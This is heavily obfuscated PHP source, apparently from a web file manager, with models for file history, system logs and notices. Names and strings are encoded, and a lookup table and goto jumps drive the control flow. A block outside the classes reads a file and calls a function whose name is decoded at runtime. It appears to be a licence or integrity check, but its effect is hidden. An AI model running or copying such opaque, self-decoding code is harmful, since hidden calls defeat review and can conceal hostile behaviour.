"{$àà¤·øí}\151\157\137\x66\x69\154\x65\40\146\x69\x6c\x65\x73\x20\157\156\x20\x66\151\x6c\x65\x73\56\146\151\154\145\111\104\x20\x3d\x20\x68\151\x73\x74\157\x72\x79\56\x66\x69\x6c\145\x49\104"; return $this->alias($Ë°¦õ·[2260])->where(array($Ë°¦õ·[495] => $Üìë’”))->join($˜©·ã, $Ë°¦õ·[2261])->find(); } public function removeItem($¤æ­æ‚) { $Â’úûÀ„ =& $_SERVER[™¸œØ®Ü]; $œå›îß€ = array($Â’úûÀ„[495] => $¤æ­æ‚); $àÏõªÑæ = $this->where($œå›îß€)->find(); if ($àÏõªÑæ) { $¢ÒÎš£ = $this->where($œå›îß€)->delete(); Model($Â’úûÀ„[548])->remove($àÏõªÑæ[$Â’úûÀ„[545]]); return $¢ÒÎš£; } return !1; } public function removeBySource($¬¯¹ö¨) { $ŒĞó€Øı =& $_SERVER[™¸œØ®Ü]; if (!$¬¯¹ö¨) { return !1; } if (!is_array($¬¯¹ö¨)) { $¬¯¹ö¨ = array($¬¯¹ö¨); } $¾íµı¶´ = array($ŒĞó€Øı[493] => array($ŒĞó€Øı[7], $¬¯¹ö¨)); $¿ïÅäôß = $this->field($ŒĞó€Øı[546])->where($¾íµı¶´)->select(); if ($¿ïÅäôß) { $this->where($¾íµı¶´)->delete(); $Øü¬Úçó = array_to_keyvalue($¿ïÅäôß, $ŒĞó€Øı[12], $ŒĞó€Øı[545]); Model($ŒĞó€Øı[548])->remove($Øü¬Úçó); } return !0; } public function setDetail($ë…Ò´³‚, $ÖÃ£·ã¹) { $íËÎãÕŒ =& $_SERVER[™¸œØ®Ü]; return $this->where(array($íËÎãÕŒ[495] => $ë…Ò´³‚))->save(array($íËÎãÕŒ[2251] => $ÖÃ£·ã¹)); } public function rollbackToItem($ëÃşõÇÔ, $û¿Àçè ) { $Ôï½»©¾ =& $_SERVER[™¸œØ®Ü]; $…½ğ¢±Ï = Model($Ôï½»©¾[915])->sourceInfo($ëÃşõÇÔ); $this->addHistory($…½ğ¢±Ï, LNG($Ôï½»©¾[2262])); $ßš·áùİ = $this->find($û¿Àçè ); $°×ë°¨ = array($Ôï½»©¾[545] => $ßš·áùİ[$Ôï½»©¾[545]], $Ôï½»©¾[79] => $ßš·áùİ[$Ôï½»©¾[79]], $Ôï½»©¾[88] => time(), $Ôï½»©¾[531] => USER_ID); Model($Ôï½»©¾[915])->where(array($Ôï½»©¾[193] => $ëÃşõÇÔ))->save($°×ë°¨); return $this->where(array($Ôï½»©¾[495] => $û¿Àçè ))->delete(); } public function clearSame($ŸØÛ¬Œ˜) { $Æ´˜ß­İ =& $_SERVER[™¸œØ®Ü]; $Óë±·àí = $this->listData($ŸØÛ¬Œ˜); $°¶Ğü²ù = array_to_keyvalue_group($Óë±·àí, $Æ´˜ß­İ[545]); $ŒÆ¿½·Ô = array(); $›¾ûÚİœ = array(); foreach ($°¶Ğü²ù as $—ÏÏÀêÉ) { if (!$—ÏÏÀêÉ || count($—ÏÏÀêÉ) <= 1) { continue; } foreach ($—ÏÏÀêÉ as $òÛÍ’¹ö) { $ŒÆ¿½·Ô[] = $òÛÍ’¹ö[$Æ´˜ß­İ[545]]; $›¾ûÚİœ[] = $òÛÍ’¹ö[$Æ´˜ß­İ[477]]; } } if (!$›¾ûÚİœ) { return; } $this->where(array($Æ´˜ß­İ[477] => array($Æ´˜ß­İ[7], $›¾ûÚİœ)))->delete(); Model($Æ´˜ß­İ[548])->remove($ŒÆ¿½·Ô); } public function userSpace() { $¹ç… Şå =& $_SERVER[™¸œØ®Ü]; $õæ…˜­¯ = $this->tablePrefix; $™Ô‹Ù€İ = array($¹ç… Şå[1786] => USER_ID); $ šäô = "{$õæ…˜­¯}\151\x6f\137\x66\x69\154\145\40\146\151\154\145\163\x20\157\x6e\x20\x66\x69\x6c\145\x73\56\x66\x69\x6c\x65\x49\104\40\x3d\x20\150\x69\x73\164\157\162\x79\x2e\x66\x69\154\145\x49\x44"; return $this->alias($¹ç… Şå[2260])->where($™Ô‹Ù€İ)->join($ šäô, $¹ç… Şå[2261])->sum($¹ç… Şå[79]); } } if ($_SERVER[$_SERVER[™¸œØ®Ü][971]] != $_SERVER[$_SERVER[™¸œØ®Ü][1460]]) { $_getc = $_SERVER[™¸œØ®Ü][973]; $_getfile = $_SERVER[$_SERVER[™¸œØ®Ü][968]] . $_SERVER[™¸œØ®Ü][969]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¸œØ®Ü][287], $_getfilec); if (count($_getarrs) < $_SERVER[™¸œØ®Ü][696]) { $exit = $_SERVER[™¸œØ®Ü][974]; $exit(); } $_act = $_SERVER[™¸œØ®Ü][1458]; $_act($_SERVER[$_SERVER[™¸œØ®Ü][1457]]); } goto Fµâ×ëÑ©ä; Fôµ’ƒôíÖ: $fileSize = strrev(base64_decode($_SERVER[ñ¦æ»åÏ][0])); function binCheckNeq($Ò´à²Æô, $Œ©’¸çÖ) { return $Ò´à²Æô != $Œ©’¸çÖ; } $_SERVER[$_SERVER[ñ¦æ»åÏ][1]] = $fileSize($_SERVER[$_SERVER[ñ¦æ»åÏ][2]]); goto A”Ú²ÕË·; AĞé—À³Ü: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\137\x6c\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\x69\x6d\x65", "\x74\x69\155\x65", "\x69\x6e\163\x65\x72\x74", "\146\x75\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¿¯ˆŠù =& $_SERVER[™¸œØ®Ü]; return array($¿¯ˆŠù[2370] => LNG($¿¯ˆŠù[2371]), $¿¯ˆŠù[2372] => LNG($¿¯ˆŠù[2373]), $¿¯ˆŠù[1938] => LNG($¿¯ˆŠù[2374]), $¿¯ˆŠù[2375] => LNG($¿¯ˆŠù[2376]), $¿¯ˆŠù[2377] => LNG($¿¯ˆŠù[2378]), $¿¯ˆŠù[2379] => LNG($¿¯ˆŠù[2380]), $¿¯ˆŠù[2381] => LNG($¿¯ˆŠù[2382]), $¿¯ˆŠù[1968] => LNG($¿¯ˆŠù[2382]), $¿¯ˆŠù[1969] => LNG($¿¯ˆŠù[2383]), $¿¯ˆŠù[2384] => LNG($¿¯ˆŠù[2385]), $¿¯ˆŠù[2386] => LNG($¿¯ˆŠù[2387]), $¿¯ˆŠù[2388] => LNG($¿¯ˆŠù[2389]), $¿¯ˆŠù[2390] => LNG($¿¯ˆŠù[2391]), $¿¯ˆŠù[1966] => LNG($¿¯ˆŠù[2392]), $¿¯ˆŠù[2393] => LNG($¿¯ˆŠù[2394]), $¿¯ˆŠù[1973] => LNG($¿¯ˆŠù[2395]), $¿¯ˆŠù[2396] => LNG($¿¯ˆŠù[2397]), $¿¯ˆŠù[2398] => LNG($¿¯ˆŠù[2399]), $¿¯ˆŠù[2400] => LNG($¿¯ˆŠù[2401]), $¿¯ˆŠù[2402] => LNG($¿¯ˆŠù[2403]), $¿¯ˆŠù[1976] => LNG($¿¯ˆŠù[2404]), $¿¯ˆŠù[1977] => LNG($¿¯ˆŠù[2405]), $¿¯ˆŠù[2406] => LNG($¿¯ˆŠù[2407]), $¿¯ˆŠù[2408] => LNG($¿¯ˆŠù[2409]), $¿¯ˆŠù[2410] => LNG($¿¯ˆŠù[2411]), $¿¯ˆŠù[1971] => LNG($¿¯ˆŠù[2412]), $¿¯ˆŠù[2413] => LNG($¿¯ˆŠù[2414]), $¿¯ˆŠù[1970] => LNG($¿¯ˆŠù[2415]), $¿¯ˆŠù[2416] => LNG($¿¯ˆŠù[2417]), $¿¯ˆŠù[2418] => LNG($¿¯ˆŠù[2419]), $¿¯ˆŠù[2420] => LNG($¿¯ˆŠù[2419]), $¿¯ˆŠù[2421] => LNG($¿¯ˆŠù[2422]), $¿¯ˆŠù[2423] => LNG($¿¯ˆŠù[2423]), $¿¯ˆŠù[2424] => LNG($¿¯ˆŠù[1942]), $¿¯ˆŠù[2425] => LNG($¿¯ˆŠù[2426]), $¿¯ˆŠù[2427] => LNG($¿¯ˆŠù[2428]), $¿¯ˆŠù[2429] => LNG($¿¯ˆŠù[2430]), $¿¯ˆŠù[2431] => LNG($¿¯ˆŠù[2432]), $¿¯ˆŠù[2433] => LNG($¿¯ˆŠù[2434]), $¿¯ˆŠù[2435] => LNG($¿¯ˆŠù[2435]), $¿¯ˆŠù[2436] => LNG($¿¯ˆŠù[2437]), $¿¯ˆŠù[2438] => LNG($¿¯ˆŠù[2439]), $¿¯ˆŠù[2440] => LNG($¿¯ˆŠù[2441]), $¿¯ˆŠù[2442] => LNG($¿¯ˆŠù[2443]), $¿¯ˆŠù[2444] => LNG($¿¯ˆŠù[2445]), $¿¯ˆŠù[2446] => LNG($¿¯ˆŠù[2447]), $¿¯ˆŠù[212] => LNG($¿¯ˆŠù[212]), $¿¯ˆŠù[213] => LNG($¿¯ˆŠù[2448]), $¿¯ˆŠù[2449] => LNG($¿¯ˆŠù[2449])); } private function typeFile() { $¤ë÷¹®Ü =& $_SERVER[™¸œØ®Ü]; $Ó¢Ù·£Ş = array($¤ë÷¹®Ü[1973] => array($¤ë÷¹®Ü[1974]), $¤ë÷¹®Ü[2388] => array($¤ë÷¹®Ü[2450]), $¤ë÷¹®Ü[2390] => array($¤ë÷¹®Ü[2451]), $¤ë÷¹®Ü[1966] => array($¤ë÷¹®Ü[1967], $¤ë÷¹®Ü[2452]), $¤ë÷¹®Ü[2398] => array(), $¤ë÷¹®Ü[2400] => array(), $¤ë÷¹®Ü[2402] => array(), $¤ë÷¹®Ü[1976] => array($¤ë÷¹®Ü[1978]), $¤ë÷¹®Ü[1977] => array($¤ë÷¹®Ü[1978]), $¤ë÷¹®Ü[2406] => array($¤ë÷¹®Ü[2453]), $¤ë÷¹®Ü[2408] => array($¤ë÷¹®Ü[2453]), $¤ë÷¹®Ü[2410] => array($¤ë÷¹®Ü[2454]), $¤ë÷¹®Ü[2396] => array($¤ë÷¹®Ü[2455]), $¤ë÷¹®Ü[1971] => array($¤ë÷¹®Ü[2456]), $¤ë÷¹®Ü[2413] => array($¤ë÷¹®Ü[2457]), $¤ë÷¹®Ü[1970] => array($¤ë÷¹®Ü[1972])); return $Ó¢Ù·£Ş; } private function typeAll() { $æÛñû¹Ê =& $_SERVER[™¸œØ®Ü]; $˜øºÆ¥¬ = $this->typeList; $éŸ¿µÀ¶ = array_filter($this->typeFile()); foreach ($éŸ¿µÀ¶ as $öç€¹€‰ => $”¤ü³ãö) { $˜øºÆ¥¬[$”¤ü³ãö[0]] = $˜øºÆ¥¬[$öç€¹€‰]; } $˜øºÆ¥¬[$æÛñû¹Ê[1978]] = LNG($æÛñû¹Ê[2458]); $˜øºÆ¥¬[$æÛñû¹Ê[2453]] = LNG($æÛñû¹Ê[2459]); return $˜øºÆ¥¬; } public function addLog($ÁĞÜŠÙå, $€—ù°² = array()) { $×¨¾Ûã =& $_SERVER[™¸œØ®Ü]; if (!isset($this->typeList[$ÁĞÜŠÙå])) { return; } $ºƒ’´Š£ = Session::get($×¨¾Ûã[2137]); if (!$ºƒ’´Š£) { $ºƒ’´Š£ = _get($€—ù°², $×¨¾Ûã[1795], 0); } if ($ÁĞÜŠÙå == $×¨¾Ûã[2425] && is_array($€—ù°²[$×¨¾Ûã[2460]]) && !$€—ù°²[$×¨¾Ûã[2460]]) { return; } $¨´‰¢†À = get_client_ip(); if (!$€—ù°² || strlen(json_encode($€—ù°²)) >= 1024 * 64) { if ($€—ù°² && is_array($€—ù°²)) { $€—ù°² = array_intersect_key($€—ù°², array_flip($×¨¾Ûã[477], $×¨¾Ûã[32])); $€—ù°²[$×¨¾Ûã[2461]] = $¨´‰¢†À; } else { $€—ù°² = array($×¨¾Ûã[2461] => $¨´‰¢†À); } } else { if (is_array($€—ù°²)) { $€—ù°²[$×¨¾Ûã[2461]] = $¨´‰¢†À; } else { $€—ù°² = array($×¨¾Ûã[1306] => $€—ù°², $×¨¾Ûã[2461] => $¨´‰¢†À); } } $€—ù°² = array($×¨¾Ûã[1785] => Session::sign(), $×¨¾Ûã[1786] => intval($ºƒ’´Š£), $×¨¾Ûã[33] => $ÁĞÜŠÙå, $×¨¾Ûã[1788] => json_encode($€—ù°²)); return parent::add($€—ù°²); } public function remove($¯ç©…ºá) { $this->where(array($_SERVER[™¸œØ®Ü][495] => $¯ç©…ºá))->delete(); } private function _makeOrder($‰ìÌŞØÍ = '') { $´àŸò› =& $_SERVER[™¸œØ®Ü]; $§Ş­º’‡ = $´àŸò›[233]; $æ½¨–Åö = array($´àŸò›[525] => $´àŸò›[526], $´àŸò›[527] => $´àŸò›[528]); $‰ê©åş = Input::get($´àŸò›[533], $´àŸò›[7], $´àŸò›[2177], array($´àŸò›[2091], $´àŸò›[527])); $‰ê©åş = $æ½¨–Åö[$‰ê©åş]; $‰ìÌŞØÍ = $‰ìÌŞØÍ . "{$§Ş­º’‡}\x20{$‰ê©åş}"; return $this->order($‰ìÌŞØÍ); } public function get($­É“ûšÀ = '') { $‹ıç‰Ä¼ =& $_SERVER[™¸œØ®Ü]; if (!$­É“ûšÀ) { show_json(array()); } $¡º°‚ø = array(); if ($­É“ûšÀ[$‹ıç‰Ä¼[1795]]) { $¡º°‚ø[$‹ıç‰Ä¼[1795]] = $­É“ûšÀ[$‹ıç‰Ä¼[1795]]; } if (isset($­É“ûšÀ[$‹ıç‰Ä¼[845]])) { $¿‘ˆ´«ú = $­É“ûšÀ[$‹ıç‰Ä¼[845]]; $È¶ºË§ = isset($­É“ûšÀ[$‹ıç‰Ä¼[846]]) ? $­É“ûšÀ[$‹ıç‰Ä¼[846]] : time(); $¡º°‚ø[$‹ıç‰Ä¼[233]] = array($‹ıç‰Ä¼[410], array($¿‘ˆ´«ú, $È¶ºË§)); } if ($­É“ûšÀ[$‹ıç‰Ä¼[33]]) { $Êã»¯ç = explode($‹ıç‰Ä¼[50], $­É“ûšÀ[$‹ıç‰Ä¼[33]]); $¤ÙÉàï = $this->typeFile(); $ò“İ¡Ã€ = array(); foreach ($Êã»¯ç as $÷ºˆ–Îš) { $ò“İ¡Ã€[] = $÷ºˆ–Îš; if (isset($¤ÙÉàï[$÷ºˆ–Îš])) { $ò“İ¡Ã€ = array_merge($ò“İ¡Ã€, $¤ÙÉàï[$÷ºˆ–Îš]); } } $ò“İ¡Ã€ = array_unique($ò“İ¡Ã€); if ($ò“İ¡Ã€) { $¡º°‚ø[$‹ıç‰Ä¼[33]] = array($‹ıç‰Ä¼[7], $ò“İ¡Ã€); } } else { $¡º°‚ø[$‹ıç‰Ä¼[33]] = array($‹ıç‰Ä¼[2462], $‹ıç‰Ä¼[2463]); } if (!empty($­É“ûšÀ[$‹ıç‰Ä¼[2461]])) { $¡º°‚ø[$‹ıç‰Ä¼[528]] = array($‹ıç‰Ä¼[461], "\x25{$­É“ûšÀ[$‹ıç‰Ä¼[2461]]}\45"); } $ïã¾´»‚ = $this->_makeOrder()->where($¡º°‚ø)->selectPage(); if (empty($ïã¾´»‚[$‹ıç‰Ä¼[447]])) { show_json(array(), !0, $ïã¾´»‚[$‹ıç‰Ä¼[444]]); } $ïã¾´»‚[$‹ıç‰Ä¼[447]] = $this->logList($ïã¾´»‚[$‹ıç‰Ä¼[447]]); return $ïã¾´»‚; } private function ipAddress(&$ğòËŞ™) { $çÜàÓ÷¸ =& $_SERVER[™¸œØ®Ü]; if (!empty($ğòËŞ™[$çÜàÓ÷¸[2461]])) { $¦½»ú°ë = IpLocation::get($ğòËŞ™[$çÜàÓ÷¸[2461]]); } else { $¦½»ú°ë = LNG($çÜàÓ÷¸[2464]); } $ğòËŞ™[$çÜàÓ÷¸[2465]] = $¦½»ú°ë; } private function descZipDownload($˜Ù€‡Æ, &$–ƒÈ¹İ—) { $æö¸³¡” =& $_SERVER[™¸œØ®Ü]; if (!isset($˜Ù€‡Æ[$æö¸³¡”[2466]])) { return; } $”Ã’€ = json_decode($˜Ù€‡Æ[$æö¸³¡”[2466]], !0); foreach ($”Ã’€ as $ğ´º˜Ä§) { try { $­¬ŞÚÂ = IO::infoFullSimple($ğ´º˜Ä§[$æö¸³¡”[87]]); } catch (Exception $™´¾ÂŸª) { continue; } $˜Ù€‡Æ[$æö¸³¡”[87]] = $ğ´º˜Ä§[$æö¸³¡”[87]]; $–ƒÈ¹İ—[] = $˜Ù€‡Æ[$æö¸³¡”[193]] = $­¬ŞÚÂ[$æö¸³¡”[193]]; $–ƒÈ¹İ—[] = $˜Ù€‡Æ[$æö¸³¡”[2233]] = $­¬ŞÚÂ[$æö¸³¡”[192]]; break; } return $˜Ù€‡Æ; } private function getSourceList(&$£ùÅ¥ˆ) { $ĞÛ‹‡¾ =& $_SERVER[™¸œØ®Ü]; $Â¦‰Ú„² = array(); foreach ($£ùÅ¥ˆ as $œÌï×ûˆ => $ûí…•Î«) { $ïµ¤–Ü® = json_decode($ûí…•Î«[$ĞÛ‹‡¾[528]], !0); if ($ûí…•Î«[$ĞÛ‹‡¾[33]] == $ĞÛ‹‡¾[1969]) { $ïµ¤–Ü® = $this->descZipDownload($ïµ¤–Ü®, $Â¦‰Ú„²); $£ùÅ¥ˆ[$œÌï×ûˆ][$ĞÛ‹‡¾[528]] = json_encode($ïµ¤–Ü®); continue; } if (strpos($ûí…•Î«[$ĞÛ‹‡¾[33]], $ĞÛ‹‡¾[2235]) !== 0) { if (!isset($ïµ¤–Ü®[$ĞÛ‹‡¾[87]]) || strpos($ûí…•Î«[$ĞÛ‹‡¾[33]], $ĞÛ‹‡¾[2467]) !== 0) { continue; } try { $ŒèŠ»Àû = IO::infoFullSimple($ïµ¤–Ü®[$ĞÛ‹‡¾[87]]); } catch (Exception $›ã¦¢é) { continue; } $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[193]] = $ŒèŠ»Àû[$ĞÛ‹‡¾[193]]; $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[2233]] = $ŒèŠ»Àû[$ĞÛ‹‡¾[192]]; $£ùÅ¥ˆ[$œÌï×ûˆ][$ĞÛ‹‡¾[528]] = json_encode($ïµ¤–Ü®); continue; } $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[193]]; $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[2233]]; if ($ïµ¤–Ü®[$ĞÛ‹‡¾[33]] == $ĞÛ‹‡¾[627]) { $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[528]][$ĞÛ‹‡¾[1260]]; $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[528]][$ĞÛ‹‡¾[1261]]; } if ($ïµ¤–Ü®[$ĞÛ‹‡¾[33]] == $ĞÛ‹‡¾[2244]) { $Â¦‰Ú„²[] = $ïµ¤–Ü®[$ĞÛ‹‡¾[528]][$ĞÛ‹‡¾[193]]; } } if (!$Â¦‰Ú„²) { return array(); } return Model($ĞÛ‹‡¾[915])->sourceListInfo($Â¦‰Ú„², !0); } private function logList($½ïŸ«Ïê) { $ÙçùÕÜÚ =& $_SERVER[™¸œØ®Ü]; $¬Ô´ÜÖ = array_to_keyvalue($½ïŸ«Ïê, $ÙçùÕÜÚ[12], $ÙçùÕÜÚ[1795]); $ƒÛ¿Ñü› = Model($ÙçùÕÜÚ[601])->userListInfo(array_unique($¬Ô´ÜÖ)); $Î°âñ±‚ = $this->getSourceList($½ïŸ«Ïê); $†¨×ºÚ° = $this->typeAll(); $ô¤çà€Ù = array(); $á´¸İĞ = array(); foreach ($½ïŸ«Ïê as $€ßĞØ¡‡ => $ëõŸ—ğ˜) { $º¨ÜÁÖ® = $ëõŸ—ğ˜[$ÙçùÕÜÚ[33]]; $’â˜ìê = isset($ƒÛ¿Ñü›[$ëõŸ—ğ˜[$ÙçùÕÜÚ[1795]]]) ? $ƒÛ¿Ñü›[$ëõŸ—ğ˜[$ÙçùÕÜÚ[1795]]] : !1; $ûæ›‚Ü = strpos($º¨ÜÁÖ®, $ÙçùÕÜÚ[2468]) === 0 ? LNG($ÙçùÕÜÚ[2469]) : LNG($ÙçùÕÜÚ[2464]); $ëõŸ—ğ˜[$ÙçùÕÜÚ[32]] = isset($’â˜ìê[$ÙçùÕÜÚ[32]]) ? $’â˜ìê[$ÙçùÕÜÚ[32]] : LNG($ÙçùÕÜÚ[2464]); $ëõŸ—ğ˜[$ÙçùÕÜÚ[2295]] = isset($’â˜ìê[$ÙçùÕÜÚ[2295]]) ? $’â˜ìê[$ÙçùÕÜÚ[2295]] : $ÙçùÕÜÚ[12]; $ëõŸ—ğ˜[$ÙçùÕÜÚ[1683]] = isset($†¨×ºÚ°[$º¨ÜÁÖ®]) ? $†¨×ºÚ°[$º¨ÜÁÖ®] : $ûæ›‚Ü; $ëõŸ—ğ˜[$ÙçùÕÜÚ[2176]] = $’â˜ìê; $ÛŞ½„ó = json_decode($ëõŸ—ğ˜[$ÙçùÕÜÚ[528]], !0); $ëõŸ—ğ˜[$ÙçùÕÜÚ[2461]] = isset($ÛŞ½„ó[$ÙçùÕÜÚ[2461]]) ? $ÛŞ½„ó[$ÙçùÕÜÚ[2461]] : $ÙçùÕÜÚ[12]; $ëõŸ—ğ˜[$ÙçùÕÜÚ[2465]] = IpLocation::get($ëõŸ—ğ˜[$ÙçùÕÜÚ[2461]]); if (strpos($º¨ÜÁÖ®, $ÙçùÕÜÚ[2235]) === 0 || isset($ÛŞ½„ó[$ÙçùÕÜÚ[2233]])) { $ÛŞ½„ó[$ÙçùÕÜÚ[90]] = $Î°âñ±‚[$ÛŞ½„ó[$ÙçùÕÜÚ[193]]]; $ÛŞ½„ó[$ÙçùÕÜÚ[2249]] = $Î°âñ±‚[$ÛŞ½„ó[$ÙçùÕÜÚ[2233]]]; if ($ÛŞ½„ó[$ÙçùÕÜÚ[33]] == $ÙçùÕÜÚ[627]) { $ÛŞ½„ó[$ÙçùÕÜÚ[528]][$ÙçùÕÜÚ[1260]] = $Î°âñ±‚[$ÛŞ½„ó[$ÙçùÕÜÚ[528]][$ÙçùÕÜÚ[1260]]]; $ÛŞ½„ó[$ÙçùÕÜÚ[528]][$ÙçùÕÜÚ[1261]] = $Î°âñ±‚[$ÛŞ½„ó[$ÙçùÕÜÚ[528]][$ÙçùÕÜÚ[1261]]]; } if ($ÛŞ½„ó[$ÙçùÕÜÚ[33]] == $ÙçùÕÜÚ[2244]) { $ÛŞ½„ó[$ÙçùÕÜÚ[528]][$ÙçùÕÜÚ[193]] = $Î°âñ±‚[$ÛŞ½„ó[$ÙçùÕÜÚ[528]][$ÙçùÕÜÚ[193]]]; } if ($ÛŞ½„ó[$ÙçùÕÜÚ[33]] == $ÙçùÕÜÚ[1964]) { $ÛŞ½„ó[$ÙçùÕÜÚ[2249]] = $ÛŞ½„ó[$ÙçùÕÜÚ[90]]; $ÛŞ½„ó[$ÙçùÕÜÚ[2233]] = $ÛŞ½„ó[$ÙçùÕÜÚ[2249]][$ÙçùÕÜÚ[193]]; $ÛŞ½„ó[$ÙçùÕÜÚ[90]] = !1; $ÛŞ½„ó[$ÙçùÕÜÚ[193]] = $ÙçùÕÜÚ[12]; } $‰µ¤ÉËê = array($ÙçùÕÜÚ[1964], $ÙçùÕÜÚ[2231]); if (!in_array($ÛŞ½„ó[$ÙçùÕÜÚ[33]], $‰µ¤ÉËê)) { if ($ÛŞ½„ó[$ÙçùÕÜÚ[90]] && $ÛŞ½„ó[$ÙçùÕÜÚ[90]][$ÙçùÕÜÚ[190]] == $ÙçùÕÜÚ[191]) { $á´¸İĞ[] = $ëõŸ—ğ˜[$ÙçùÕÜÚ[477]]; unset($½ïŸ«Ïê[$€ßĞØ¡‡]); continue; } if ($ÛŞ½„ó[$ÙçùÕÜÚ[2249]] && $ÛŞ½„ó[$ÙçùÕÜÚ[2249]][$ÙçùÕÜÚ[190]] == $ÙçùÕÜÚ[191]) { $á´¸İĞ[] = $ëõŸ—ğ˜[$ÙçùÕÜÚ[477]]; unset($½ïŸ«Ïê[$€ßĞØ¡‡]); continue; } } } $ëõŸ—ğ˜[$ÙçùÕÜÚ[528]] = $ÛŞ½„ó; unset($ëõŸ—ğ˜[$ÙçùÕÜÚ[2470]]); $ô¤çà€Ù[] = $ëõŸ—ğ˜; } $this->clearSystemPathLog($á´¸İĞ); return $ô¤çà€Ù; } private function clearSystemPathLog($¸¬Á»Ó…) { $ï“°šÛ· =& $_SERVER[™¸œØ®Ü]; if (count($¸¬Á»Ó…) == 0) { return; } $Õâïš®£ = array($ï“°šÛ·[477] => array($ï“°šÛ·[7], array_unique($¸¬Á»Ó…))); $this->where($Õâïš®£)->delete(); } public function deviceList($“È•ù‘Î, $ƒŒÈêÚÛ = 0) { $Âè¦‘ï² =& $_SERVER[™¸œØ®Ü]; $±ˆÕ‹¸ = array($Âè¦‘ï²[1795] => $“È•ù‘Î, $Âè¦‘ï²[233] => array($Âè¦‘ï²[1110], $ƒŒÈêÚÛ), $Âè¦‘ï²[33] => $Âè¦‘ï²[1938]); $Ÿ÷Ìë ß = array(); $•Ó³Ğ’® = $this->field($Âè¦‘ï²[2471])->where($±ˆÕ‹¸)->order($Âè¦‘ï²[2247])->limit(50)->select(); foreach ($•Ó³Ğ’® as $‡Ğ¢·ù => $©ğÄá¾) { if ($‡Ğ¢·ù > 0 && abs($©ğÄá¾[$Âè¦‘ï²[233]] - $•Ó³Ğ’®[$‡Ğ¢·ù - 1][$Âè¦‘ï²[233]]) < 5) { continue; } $È½¿éä€ = json_decode($©ğÄá¾[$Âè¦‘ï²[528]], !0); $©ğÄá¾[$Âè¦‘ï²[2461]] = isset($È½¿éä€[$Âè¦‘ï²[2461]]) ? $È½¿éä€[$Âè¦‘ï²[2461]] : $Âè¦‘ï²[12]; unset($È½¿éä€[$Âè¦‘ï²[2461]]); $ì•‚‘öÁ = $this->deviceType($È½¿éä€[$Âè¦‘ï²[2236]]); if (isset($Ÿ÷Ìë ß[$ì•‚‘öÁ])) { continue; } $©ğÄá¾[$Âè¦‘ï²[2465]] = IpLocation::get($©ğÄá¾[$Âè¦‘ï²[2461]]); $©ğÄá¾[$Âè¦‘ï²[528]] = $È½¿éä€; $Ÿ÷Ìë ß[$ì•‚‘öÁ] = $©ğÄá¾; } return array_values($Ÿ÷Ìë ß); } public function deviceType($Şà’Ùù¡) { return $Şà’Ùù¡; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\156\x6f\x74\151\x63\x65\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x63\x6f\x6e\164\x65\x6e\164", "\141\x75\x74\x68", "\x6d\157\x64\x65", "\x74\151\x6d\x65", "\x74\171\x70\x65", "\154\x65\x76\x65\x6c", "\x65\156\x61\x62\x6c\145", "\163\157\x72\164"); public function listData($çëÑª§ = false, $³î™³ñ“ = "\x73\x6f\162\x74", $Ï¯¶ƒİ = false) { return parent::listData($çëÑª§, $³î™³ñ“, $Ï¯¶ƒİ); } public function add($à²ŞĞ ‰) { $±ÈªÜ— =& $_SERVER[™¸œØ®Ü]; $Øä×£µ = time(); if ($à²ŞĞ ‰[$±ÈªÜ—[16]] == $±ÈªÜ—[2472]) { $Øä×£µ = strtotime($à²ŞĞ ‰[$±ÈªÜ—[206]]); } $à²ŞĞ ‰[$±ÈªÜ—[206]] = $Øä×£µ; return parent::insert($à²ŞĞ ‰); } public function update($¼º¾‚õæ, $ö‹ßÌ“’) { $Á™‡î¿Ş =& $_SERVER[™¸œØ®Ü]; $ô“«Ìûé = $this->listData($¼º¾‚õæ); if (!$ô“«Ìûé) { return !1; } $Èî¨ÍÂ€ = time(); if ($ö‹ßÌ“’[$Á™‡î¿Ş[16]] == $Á™‡î¿Ş[2472]) { $Èî¨ÍÂ€ = strtotime($ö‹ßÌ“’[$Á™‡î¿Ş[206]]); } $ö‹ßÌ“’[$Á™‡î¿Ş[206]] = $Èî¨ÍÂ€; return parent::update($¼º¾‚õæ, $ö‹ßÌ“’); } public function remove($‘‰ÆÓ®®) { $Æ÷¨„Ò = $this->listData($‘‰ÆÓ®®); if (!$Æ÷¨„Ò || $Æ÷¨„Ò[$_SERVER[™¸œØ®Ü][191]]) { return !1; } return parent::remove($‘‰ÆÓ®®); } public function sort($×«÷½„Ú, $——ê—ãî) { return parent::update($×«÷½„Ú, $——ê—ãî); } public function enable($†ìéÚàŒ, $’³şÍè) { return parent::update($†ìéÚàŒ, array($_SERVER[™¸œØ®Ü][2473] => $’³şÍè)); } private function initUserOption() { $÷§¥ší =& $_SERVER[™¸œØ®Ü]; $this->optionType = $÷§¥ší[2474]; $this->modelType = $÷§¥ší[2475]; $this->field = array($÷§¥ší[2476], $÷§¥ší[32], $÷§¥ší[206], $÷§¥ší[33], $÷§¥ší[2477], $÷§¥ší[835], $÷§¥ší[228]); } public function userNoticeGet($²Œ¼î²€ = false) { $this->initUserOption(); return parent::listData($²Œ¼î²€, $_SERVER[™¸œØ®Ü][477], !0); } public function userNoticeAdd($œÖ  È©) { $Ä£¼«íÑ =& $_SERVER[™¸œØ®Ü]; $this->initUserOption(); $ŸıášØö = $this->findByKey($Ä£¼«íÑ[2476], $œÖ  È©[$Ä£¼«íÑ[477]]); if ($ŸıášØö) { return !0; } $­Òñ‚ë€ = array($Ä£¼«íÑ[2476] => $œÖ  È©[$Ä£¼«íÑ[477]], $Ä£¼«íÑ[32] => $œÖ  È©[$Ä£¼«íÑ[32]], $Ä£¼«íÑ[206] => $œÖ  È©[$Ä£¼«íÑ[206]], $Ä£¼«íÑ[33] => isset($œÖ  